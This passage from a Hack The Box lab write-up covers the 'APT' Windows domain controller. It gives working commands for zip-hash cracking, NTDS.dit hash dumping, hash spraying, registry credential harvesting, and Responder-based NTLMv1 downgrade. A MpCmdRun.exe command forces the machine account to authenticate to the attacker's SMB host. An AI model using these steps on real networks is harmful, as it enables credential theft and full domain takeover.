+backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
+</code></pre></div><p>It cracked instantly.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\tools\john\run&gt; ./john.exe hashes/backup.zip.hash --wordlist=C:/tools/rockyou.txt
+
+...&lt;SNIP&gt;...
+iloveyousomuch   (backup.zip)
+1g 0:00:00:00 DONE (2021-04-15 08:29) 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal
+</code></pre></div><p>WIth the password is I obtained, I can unzip the backup file. It contains AD database.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
+$ tree
+.
+├── Active Directory
+│   ├── ntds.dit
+│   └── ntds.jfm
+└── registry
+    ├── SECURITY
+    └── SYSTEM
+</code></pre></div><h4 id="dumping-ntlm-hashes">Dumping NTLM Hashes</h4>
+<p><code>ntds.dit</code> is a database file for Active Directory environment, I can use <code>secretsdump.py</code> along with the <code>SECURITY</code> and <code>SYSTEM</code> file to recover it and obtain all the NTLM hashes of all the available AD user accounts</p>
+<blockquote>
+<p>NTDS stands for New Technology Directory Service and DIT stands for directory information tree.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
+$ secretsdump.py -ntds Active<span style="color:#ae81ff">\ </span>Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL &gt; ad_hashes
+</code></pre></div><p>I saved the hash to a file called <code>ad_hashes</code>.</p>
+<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
+<h4 id="valid-user-enumeration">Valid User Enumeration</h4>
+<p>Because there are so many data to try, I might accidentally get locked out if spraying blindly. But, with tools called <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>, I can enumerate for valid users. The tools uses Kerberos pre-auth to determine a valid user.</p>
+<p>If the user is a valid user, KDC returns <code>UF_DONT_REQUIRE_PREAUTH</code>. If it’s not, it returns <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>.</p>
+<p>Before that, I&rsquo;ll pull the users and NTLM hash from <code>ad_hashes</code> and store them in separate list. I&rsquo;ll feed <code>users.list</code> to <code>kerbrute</code>.</p>
+<p><code>users.list</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
+$ cat ad_hashes | grep <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> | cut -d : -f1 &gt; ../users.list
+</code></pre></div><p><code>userhash.list</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
+$ cat ad_hashes | grep <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> | cut -d : -f4 &gt; ../userhash.list
+</code></pre></div><p>I ran <code>kerbrute</code>, and after some time, it returned three legitimate users.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ kerbrute userenum  --dc apt --domain htb.local users.list
+
+...&lt;SNIP&gt;...
+2021/04/14 22:02:35 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+2021/04/14 22:02:35 &gt;   apt:88
+
+2021/04/14 22:03:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       APT$@htb.local
+2021/04/14 22:03:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Administrator@htb.local
+2021/04/14 22:07:31 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       henry.vinson@htb.local
+2021/04/14 22:15:52 &gt;  Done! Tested <span style="color:#ae81ff">2001</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> valid<span style="color:#f92672">)</span> in 796.320 second
+</code></pre></div><p><code>APT$</code> is an account used for authentication purposes in the domain, it can not be used to login into the system. Because of that, I&rsquo;ll only keep <code>administrator</code> and <code>henry.vinson</code> on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.</p>
+<h4 id="hash-brute-force">Hash Brute-force</h4>
+<p>Using <code>henry.vinson:2de80758521541d19cabba480b260e8f</code> pair returns an authorization error message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72»
+$ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code <span style="color:#ae81ff">1</span>
+</code></pre></div><p>Another option is to spray the NTLM hashes on <code>henry.vinson</code>.</p>
+<p>Unfortunately, <code>kerbrute</code> doesn&rsquo;t support pass-the-hash yet. But there is a Python version of <code>kerbrute</code> called <code>pyKerbrute</code>. One of its tools called <code>ADPwdSpray.py</code> supports bruteforcing with hash.</p>
+<ul>
+<li><a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ git clone https://github.com/3gstudent/pyKerbrute.git
+</code></pre></div><p>By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+        kdc_a <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#75715e"># apt</span>
+        user_realm <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>upper() <span style="color:#75715e"># htb.local</span>
+        user_name <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># henry.vinson, administrator</span>
+        hashes <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>readlines() <span style="color:#75715e"># aad3...hashes</span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] DomainControlerAddr: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(kdc_a))
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] DomainName:          </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(user_realm))
+        
+        <span style="color:#66d9ef">for</span> user_hash <span style="color:#f92672">in</span> hashes:
+        	sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">[*] Trying hash: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(user_hash)) <span style="color:#75715e"># to make sure it checks every hash in list</span>
+        	user_key <span style="color:#f92672">=</span> (RC4_HMAC, user_hash<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>))
+        	passwordspray_tcp(user_realm, user_name, user_key, kdc_a, user_hash)
+</code></pre></div><p>After a few minutes, it returns a valid hash that works on henry.vinson</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «pyKerbrute» «10.10.14.72» 
+$ wc -c ../userhash.list 
+<span style="color:#ae81ff">66001</span> userhash.list
+
+→ root@iamf «pyKerbrute» «10.10.14.72» git:<span style="color:#f92672">(</span>temp<span style="color:#f92672">)</span> ✗ 
+$ python ADPwdSpray.py apt htb.local <span style="color:#e6db74">&#39;henry.vinson&#39;</span> ../userhash.list | tee ../pykerbrute-spray
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DomainControlerAddr: apt
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DomainName:          HTB.LOCAL
+
+...&lt;SNIP&gt;...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-henryvinson_adm">Shell as henry.vinson_adm</h3>
+<h4 id="forwarding-ipv4---ipv6">Forwarding IPv4 -&gt; IPv6</h4>
+<p>Here, a relay or a port forwarding is required to make some tools work on IPv6. I came up with two solutions:</p>
+<p>First, use socat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ socat tcp-listen:445,fork tcp6:apt:445
+</code></pre></div><p>Second, use ssh.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ ssh -L 445:apt:445 root@localhost -Nf
+
+→ root@iamf «apt» «10.10.14.72» 
+$ netstat -tlpn
+Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:445           0.0.0.0:*               LISTEN      8548/ssh            
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      8087/sshd: /usr/sbin 
+tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> ::1:445                 :::*                    LISTEN      8548/ssh 
+</code></pre></div><p>I can confirm both forwarding options work by running <code>CrackMapExec</code> to localhost using <code>henry.vinson</code> creds</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb 
+SMB         127.0.0.1       <span style="color:#ae81ff">445</span>    APT              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:APT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:htb.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+SMB         127.0.0.1       <span style="color:#ae81ff">445</span>    APT              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> htb.local<span style="color:#ae81ff">\h</span>enry.vinson e53d87d42adaa3ca32bdb34a876cbffb 
+</code></pre></div><h4 id="registry-enumeration">Registry Enumeration</h4>
+<p><code>henry.vinson</code> can not be used to login remotely into the box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code <span style="color:#ae81ff">1</span>
+</code></pre></div><p>Instead, I can perform enumeration on the user registry using <code>reg.py</code> from Impacket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ reg.py htb.local/henry.vinson@apt -hashes <span style="color:#e6db74">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU
+Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot check RemoteRegistry status. Hoping it is started...
+HKU
+HKU<span style="color:#ae81ff">\C</span>onsole
+HKU<span style="color:#ae81ff">\C</span>ontrol Panel
+HKU<span style="color:#ae81ff">\E</span>nvironment
+HKU<span style="color:#ae81ff">\K</span>eyboard Layout
+HKU<span style="color:#ae81ff">\N</span>etwork
+HKU<span style="color:#ae81ff">\S</span>oftware
+HKU<span style="color:#ae81ff">\S</span>ystem
+HKU<span style="color:#ae81ff">\V</span>olatile Environment
+</code></pre></div><p>Checking on <code>HKU\Software</code> is worth trying since some applications may store their credentials in a registry.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ reg.py htb.local/henry.vinson@apt -hashes <span style="color:#e6db74">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span style="color:#ae81ff">\\</span>Software   
+Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot check RemoteRegistry status. Hoping it is started...
+HKU<span style="color:#ae81ff">\S</span>oftware
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\G</span>iganticHostingManagementSystem
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\M</span>icrosoft
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\P</span>olicies
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\R</span>egisteredApplications
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\V</span>Mware, Inc.
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\W</span>ow6432Node
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\C</span>lasses
+</code></pre></div><p>The <code>HKU\Software\GiganticHostingManagementSystem</code> contains a set of credentials for username <code>henry.vinson_adm</code> and a password of <code>G1#Ny5@2dvht</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ reg.py htb.local/henry.vinson@apt -hashes <span style="color:#e6db74">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span style="color:#ae81ff">\\</span>Software<span style="color:#ae81ff">\\</span>GiganticHostingManagementSystem
+Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Cannot check RemoteRegistry status. Hoping it is started...
+HKU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\G</span>iganticHostingManagementSystem
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht
+
+</code></pre></div><h4 id="remote-access">Remote Access</h4>
+<p><code>henry.vinson_adm</code> credentials can be used to gain a foothold on the system remotely. I’ll just grab the user flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ evil-winrm -i apt -u henry.vinson_adm -p <span style="color:#e6db74">&#39;G1#Ny5@2dvht&#39;</span>                  
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>enry.vinson_adm<span style="color:#ae81ff">\D</span>ocuments&gt; 
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>enry.vinson_adm<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>enry.vinson_adm<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+745212a817f60f27befd...&lt;SNIP&gt;...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-administrator">Shell as administrator</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Performing a text file enumeration finds a PowerShell history file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; gci -Path C:\Users -filter *.txt -Recurse -ErrorAction SilentlyContinue -Force
+
+...&lt;SNIP&gt;...
+    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/10/2020  10<span style="color:#960050;background-color:#1e0010">:</span>58 AM            458 ConsoleHost_history.txt
+
+*Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; type <span style="color:#e6db74">&#34;C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&#34;</span>
+$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> lmcompatibilitylevel -Type DWORD -Value 2 -Force}
+</code></pre></div><p>From Wikipedia:</p>
+<blockquote>
+<p><strong>Send NTLM response only</strong>: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; <strong>DCs accept LM,</strong>  NTLM, and NTLMv2 authentication.</p>
+</blockquote>
+<p>With <code>lmcompatibilitylevel = 2</code>, it means the authentication process can be downgraded to NTLMv1. The attack is explained in detail <a href="https://book.hacktricks.xyz/windows/ntlm">here</a>.</p>
+<p>There is a site called <a href="https://crack.sh">https://crack.sh</a> that provides a service for cracking NTLMv1 hash using <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow tables</a> for a specific challenge of &ldquo;1122334455667788&rdquo;.</p>
+<p>The idea here is to force APT to make a request (<em>challenge-response</em>) to the server that the attacker controls, which has been configured to send the string &ldquo;1122334455667788&rdquo; as the challenge (after downgrading the authentication process to NTLMv1).</p>
+<p>After the server receives the response from the given challenge, I can send the NTLMv1 hash from that response to <a href="https://crack.sh">crack.sh</a> for cracking and obtain NTLM/NT hash of APT afterward.</p>
+<blockquote>
+<p>Note:</p>
+<ul>
+<li>NetNTLM/NTLMv1 is an authentication protocol</li>
+<li>NetNTLM/NTLMv1 hash != NTLM hash</li>
+<li>NetNTLM/NTLMv1 hash contains NTLM hash</li>
+</ul>
+</blockquote>
+<h4 id="stealing-ntlmv1-hash-via-mpcmdrunexe">Stealing NTLMv1 hash via MpCmdRun.exe</h4>
+<p><code>MpCmdRun.exe</code> is part of Windows Defender that always runs with SYSTEM privileges. I can abuse this behavior to scan a file on my SMB server and capture the NTLMv1 authentication hash.</p>
+<blockquote>
+<p>This <a href="https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/ba-p/1185365">article</a> explaining how authentication proccess over SMB work</p>
+</blockquote>
+<p>For this, I’ll need to edit <code>/etc/responder/Responder.conf</code> first, and change the challenge from &ldquo;random&rdquo; to &ldquo;1122334455667788&rdquo;.</p>
+<p>After that, I can start <code>Responder</code> to listen on my tun0 interface and specify the <code>--lm</code> option which will downgrade the authentication to NTLMv1.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.72» 
+$ responder -I tun0 --lm                                 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 2.3.4.0
+
+  Author: Laurent Gaffie <span style="color:#f92672">(</span>laurent.gaffie@gmail.com<span style="color:#f92672">)</span>
+  To kill this script hit CTRL-C
+
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoners:
+    LLMNR                      <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    NBT-NS                     <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    DNS/MDNS                   <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Servers:
+    HTTP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    HTTPS server               <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    WPAD proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Auth proxy                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    SMB server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    Kerberos server            <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    SQL server                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    FTP server                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    IMAP server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    POP3 server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    SMTP server                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    DNS server                 <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    LDAP server                <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    RDP server                 <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> HTTP Options:
+    Always serving EXE         <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Serving EXE                <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Serving HTML               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Upstream Proxy             <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poisoning Options:
+    Analyze Mode               <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Force WPAD auth            <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Force Basic Auth           <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+    Force LM downgrade         <span style="color:#f92672">[</span>ON<span style="color:#f92672">]</span>
+    Fingerprint hosts          <span style="color:#f92672">[</span>OFF<span style="color:#f92672">]</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generic Options:
+    Responder NIC              <span style="color:#f92672">[</span>tun0<span style="color:#f92672">]</span>
+    Responder IP               <span style="color:#f92672">[</span>10.10.14.72<span style="color:#f92672">]</span>
+    Challenge set              <span style="color:#f92672">[</span>1122334455667788<span style="color:#f92672">]</span>
+    Don<span style="color:#e6db74">&#39;t Respond To Names     [&#39;</span>ISATAP<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+</code></pre></div><p>Now on APT, I can force authentication with <code>MpCmdRun.exe</code> (located on <code>C:\Program Files\Windows Defender</code>), and it errors out.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Program Files\Windows Defender&gt;.\MpCmdRun.exe -Scan -ScanType 3 <span style="color:#f92672">-File</span> \\10.10.14.72\notexist
+
+Scan starting...
+CmdTool<span style="color:#960050;background-color:#1e0010">:</span> Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log <span style="color:#66d9ef">for</span> more information
+</code></pre></div><blockquote>
+<p>Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address</p>
+</blockquote>
+<p>But on my Kali, <code>responder</code> has successfully captured the hash of <code>APT$</code>, the computer account of the box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;snip&gt;..
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+<span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv1 Client   : 10.10.10.213
+<span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv1 Username : HTB<span style="color:#ae81ff">\A</span>PT$
+<span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
+</code></pre></div><p>When there is no credentials are specified explicitly, Windows uses the current credentials.</p>
+<p>However, because Windows Defender is already running as SYSTEM (builtin localsystem), (afaik) it can not be downgraded to a lower privilege for authentication. It also won’t authenticate as SYSTEM as well. Instead, it uses the machine/computer account for authentication. LocalSystem and NetworkService credentials use computer account for authentication.</p>
+<h4 id="cracking-ntlmv1-hash">Cracking NTLMv1 hash</h4>
+<p>I can submit the hash to <a href="https://crack.sh/">https://crack.sh/</a> with the following format.</p>
+<pre><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
+</code></pre><p><div class="img-container"><img src="imgs/image-20210417161415390.png" alt="image-20210417161415390"  /></div>
+</p>
+<p>It will automatically detect the input.</p>
+<p><div class="img-container"><img src="imgs/image-20210417161541589.png" alt="image-20210417161541589"  /></div>
+</p>
+<p>Not even a minute passed, it sent me the result.</p>
+<p><div class="img-container"><img src="imgs/image-20210417161758516.png" alt="image-20210417161758516"  /></div>
+</p>
+<p>The key is <code>d167c3238864b12f5f82feae86a7f798</code>, it&rsquo;s the NTLM hash/NThash that can be used for <em>pass-the-hash</em> attack.</p>
+<h4 id="credential-dumping">Credential Dumping</h4>
+<p>NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using <code>secretsdump.py</code>. I&rsquo;ll take only the administrator hash.</p>
